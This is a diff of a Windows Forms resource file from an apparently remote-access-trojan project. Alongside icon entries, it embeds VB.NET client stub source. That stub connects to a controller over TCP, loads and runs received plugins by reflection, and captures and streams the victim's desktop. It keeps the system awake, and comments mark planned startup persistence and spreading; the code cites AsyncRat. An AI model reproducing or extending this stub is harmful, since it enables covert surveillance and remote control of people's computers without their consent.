@@ -118,14 +118,14 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
-  <data name="icons8_settinpmgs" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_settinpmgs.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_sleesdp_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_sleesdp_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_mouse_right_click_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_mouse_right_click_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_mouse_right_click_642" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_mouse_right_click_641.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_hibernssate_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_hibernssate_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="iconfinder_mouse_delete_84782" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\iconfinder_mouse_delete_84782.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -153,8 +153,11 @@
             End Try
         End If</value>
   </data>
-  <data name="icons8_pictures_folder_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_pictures_folder_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_mouse_right_click_642" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_mouse_right_click_641.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="icons8_ssdd_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_ssdd_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_hide2" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_hide2.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -168,11 +171,17 @@
   <data name="icons8_windows_cliefghfgnt_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_windows_cliefghfgnt_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="icons8_settinpmgs" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_settinpmgs.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
   <data name="icons8_spyqsqs_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_spyqsqs_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_stop_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_stop_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="icons8_switch_on_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_switch_on_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_windows_client_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_windows_client_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -188,9 +197,6 @@
   </data>
   <data name="icons8_record_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_record_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="icons8_edye2" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_edye2.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="iconfinder_anonymous_395266" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\iconfinder_anonymous_395266.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -263,6 +269,7 @@ Imports System.Drawing
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.Security.Principal
 Imports System.IO
+Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
@@ -299,14 +306,24 @@ Public Class C
 
     Public Shared CLI As TcpClient
     Public Shared p As StringBuilder
-    Public Shared ViewerDesk As Thread
+
     ''
 
     Public Shared Sub Main()
 
+
+        SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED)
+
+
         ''ADD PERMISSION
         ''ADD STARTUP
         ''ADD SPREAD
+
+
+
+
+
+
 
 
         Try
@@ -348,13 +365,14 @@ Public Class C
 
     End Sub
 
+
     Public Shared Async Sub T(ByVal l As NetworkStream)
 
 
         p = New StringBuilder
 
         Try
-            Dim b(500 * 4096) As Byte
+            Dim b(150 * 4096) As Byte
 
 
             While True
@@ -385,19 +403,20 @@ Public Class C
 
                             p.Clear()
 
-
+                            '            Dim o As String = PL_MISC &amp; "|SP1|" &amp; "" &amp; "|SP2|" &amp; "|RBT|" &amp; "|ENDING|"
                             Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")
 
 
                             Dim az As New Thread(Sub() Launch(CLI, j2(0), j2(1)))
                             az.Start()
+                            '  Task.Run(Sub() Launch(CLI, j2(0), j2(1)))
 
 
 
                             GC.Collect()
                             GC.WaitForPendingFinalizers()
                             SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
-
+                            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
 
                         ElseIf p.ToString = "|CLOSETHISSHIT|" Then
 
@@ -417,17 +436,15 @@ Public Class C
 
                             p.Clear()
 
+                            TcpV = New TcpClient
+
+                            TcpV.Connect("127.0.0.1", 8081)
 
 
 
-                            Try
-                                ViewerDesk = New Thread(AddressOf CamCam)
+                            ViewerDesk = New Thread(AddressOf CamCam)
 
-                                ViewerDesk.Start()
-                            Catch ex As Exception
-
-                            End Try
-
+                            ViewerDesk.Start()
 
                         ElseIf p.ToString.EndsWith("|TRDV|") Then
 
@@ -435,17 +452,9 @@ Public Class C
 
                             Try
                                 ViewerDesk.Abort()
-
                             Catch ex As Exception
 
                             End Try
-
-
-                            Dim ks As String = "|STPDSK|"
-
-                            CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)
-
-
                         End If
 
 
@@ -461,14 +470,16 @@ Public Class C
                 GC.Collect()
                 GC.WaitForPendingFinalizers()
                 SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+                EmptyWorkingSet(Process.GetCurrentProcess.Handle)
             End While
         Catch ex As Exception
             Exit Sub
         End Try
     End Sub
 
-
-
+    Public Shared TcpV As TcpClient
+    Public Shared ViewerDesk As Thread
+    Public Shared ns As NetworkStream
 
     &lt;DllImport("user32.dll")&gt;
     Public Shared Function GetCursorPos(&lt;Out&gt; ByRef lpPoint As Point) As Boolean
@@ -493,13 +504,14 @@ Public Class C
     Public Shared Function Desk() As Image
         Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
         Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
-
-
+        'Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
 
         Dim graphics As Graphics = Graphics.FromImage(iamage)
-        Dim upperLeftSource As New Point(0, 0)
-        Dim upperLeftDestination As New Point(0, 0)
-        graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
+
+        graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
+
+
+        graphics.CopyFromScreen(0, 0, 0, 0, primaryMonitorSize)
 
         ''this code is always the same to get "screenshot" but it doesn't include cursor so I made a way to get it !
 
@@ -515,6 +527,7 @@ Public Class C
         hj.cbSize = Marshal.SizeOf(hj)
         GetCursorInfo(hj)
 
+
         If hj.flags = &amp;H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
 
             '
@@ -522,37 +535,99 @@ Public Class C
         End If
 
 
-        Return iamage
+        graphics.Dispose()
+
+
+
+
+        ''Based On the vbnet version of AsyncRat (code below)
+
+
+        Dim o As Integer = (primaryMonitorSize.Width / 100) * 80
+        Dim o2 As Integer = (primaryMonitorSize.Height / 100) * 80
+
+
+
+
+        Dim Resize As New Bitmap(o, o2)
+
+        Dim g2 As Graphics = Graphics.FromImage(Resize)
+        g2.CompositingQuality = CompositingQuality.HighSpeed
+        g2.DrawImage(iamage, New Rectangle(0, 0, o, o2), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+
+        Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 75)
+        Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+        Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
+        encoderParameters.Param(0) = encoderParameter
+
+        Dim MS As New IO.MemoryStream
+        Resize.Save(MS, encoderInfo, encoderParameters)
+
+
+
+
+        Return Image.FromStream(MS)
+    End Function
+    ''Async Rat VBnet Function 
+    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
+        Try
+            Dim j As Integer
+            Dim encoders() As ImageCodecInfo
+            encoders = ImageCodecInfo.GetImageEncoders()
+
+            j = 0
+            While j &lt; encoders.Length
+                If encoders(j).FormatID = format.Guid Then
+                    Return encoders(j)
+                End If
+                j += 1
+            End While
+            Return Nothing
+        Catch ex As Exception
+        End Try
     End Function
 
-
     Public Shared Sub CamCam()
+        Dim bf As New BinaryFormatter
         While True
 
-
-            Dim i As Image = Desk()
-            Dim MS As New IO.MemoryStream
-
-            i.Save(MS, ImageFormat.Gif)
+            ns = TcpV.GetStream
 
 
-            Dim p As String = "|DESK|" &amp; "|SP|" &amp; Encoding.Default.GetString(MS.ToArray)
-
-            Dim B As Byte() = Encoding.Default.GetBytes(p)
-
-            '  Task.Run(Sub() CLI.GetStream.WriteAsync(B, 0, B.Length))
-
-            CLI.GetStream.WriteAsync(B, 0, B.Length)
-            MS.Dispose()
+            bf.Serialize(ns, Desk)
 
 
-            '    GC.Collect()
-            ' GC.WaitForPendingFinalizers()
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
 
-            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
 
+            Thread.Sleep(1)
+
+            '
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
+            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
         End While
     End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -568,7 +643,6 @@ Public Class C
 
 
 
-        '   
         Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
 
 
@@ -578,6 +652,7 @@ Public Class C
         GC.Collect()
         GC.WaitForPendingFinalizers()
         SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
     End Sub
 
     Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
@@ -585,13 +660,30 @@ Public Class C
     &lt;DllImport("ntdll.dll")&gt;
     Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
     End Function
+
+    &lt;DllImport("psapi")&gt;
+    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
+    End Function
+
+    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt;
+    Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
+
+    End Function
+
+    Public Enum EXECUTION_STATE As UInteger
+
+        ES_CONTINUOUS = &amp;H80000000UI
+        ES_DISPLAY_REQUIRED = &amp;H2
+        ES_SYSTEM_REQUIRED = &amp;H1
+
+    End Enum
 End Class</value>
   </data>
   <data name="icons8_toolbox1235" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_toolbox1235.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_lightning_boltsds_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_lightning_boltsds_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_pictures_folder_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_pictures_folder_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_explfosion_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_explfosion_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -602,14 +694,17 @@ End Class</value>
   <data name="icons8_info_zedzepopup" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_info_zedzepopup.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="icons8_browse_padddge_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_browse_padddge_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="icons8_skull_crossqdsbones_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_skull_crossqdsbones_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
   <data name="icons8_winqsddows8_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_winqsddows8_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_trashsa_321" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_trashsa_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="icons8_hide" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_hide.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_swap_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_swap_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -623,14 +718,14 @@ End Class</value>
   <data name="icons8_spyqsqs" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_spyqsqs.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_deskddtop_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_deskddtop_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_lightning_boltsds_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_lightning_boltsds_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_pictures_folder" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_pictures_folder.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_browse_padddge_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_browse_padddge_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_deskddtop_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_deskddtop_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_toolbox_64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_toolbox_64.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -691,9 +786,6 @@ End Class</value>
   <data name="hardware" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\hardware.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_wi-qsdqs69fi_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_wi-qsdqs69fi_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
   <data name="icons8_system_task_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_system_task_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
@@ -709,8 +801,11 @@ End Class</value>
   <data name="icons8_arrow_right_go_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_arrow_right_go_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_minimize_window_322" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_minimize_window_322.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_padsdflock_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_padsdflock_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="icons8_hide" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_hide.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_arrow_left_back_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_arrow_left_back_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -754,8 +849,14 @@ End Class</value>
   <data name="icons8_expqslosion_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_expqslosion_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="icons8_Syringe_with_a_drop_of_bazlood_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_Syringe_with_a_drop_of_bazlood_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
   <data name="icons8_c_drive_2_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_c_drive_2_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="icons8_minimize_window_322" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_minimize_window_322.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_logout_rounded_left" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_logout_rounded_left.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -799,14 +900,14 @@ End Class</value>
   <data name="icons8_blue_screen_of_deatggh_32RD" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_blue_screen_of_deatggh_32RD.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_switch_on_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_switch_on_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_wi-qsdqs69fi_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Icons\icons8_wi-qsdqs69fi_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_arrow_right_go" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_arrow_right_go.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_skull_crossqdsbones_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_skull_crossqdsbones_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_edye2" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_edye2.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="icons8_automatic_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\icons8_automatic_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -838,10 +939,7 @@ End Class</value>
   <data name="icons8_logout_rounded_left_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Icons\icons8_logout_rounded_left_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="icons8_ssdd_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\icons8_ssdd_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="icons8_Syringe_with_a_drop_of_bazlood_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Icons\icons8_Syringe_with_a_drop_of_bazlood_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  <data name="icons8_fdile_32" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\icons8_fdile_32.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
 </root>
